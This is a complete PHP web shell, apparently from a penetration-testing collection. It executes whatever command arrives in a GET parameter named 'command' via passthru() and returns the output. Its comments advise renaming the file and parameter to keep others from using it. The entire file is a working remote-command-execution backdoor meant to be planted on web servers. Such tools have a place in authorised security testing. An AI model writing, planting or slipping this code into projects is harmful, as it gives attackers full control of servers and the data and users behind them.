<?php
// Copyright (c) 2021 Ivan Šincek
// v2.6
// Requires PHP v4.0.0 or greater.

// modify the script name and request parameter name to random ones to prevent others form accessing and using your web shell
// you must URL encode your commands

header('Content-Type: text/plain; charset=UTF-8');

// your parameter/key here
$parameter = 'command';
if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'get' && isset($_GET[$parameter]) && ($_GET[$parameter] = trim($_GET[$parameter])) && strlen($_GET[$parameter]) > 0) {
    // if passthru() is disabled, search for an alternative method
    if (@passthru("($_GET[$parameter]) 2>&1") === false) {
        echo 'ERROR: The method might be disabled';
    }
    unset($_GET[$parameter]);
    // garbage collector requires PHP v5.3.0 or greater
    // @gc_collect_cycles();
}
?>
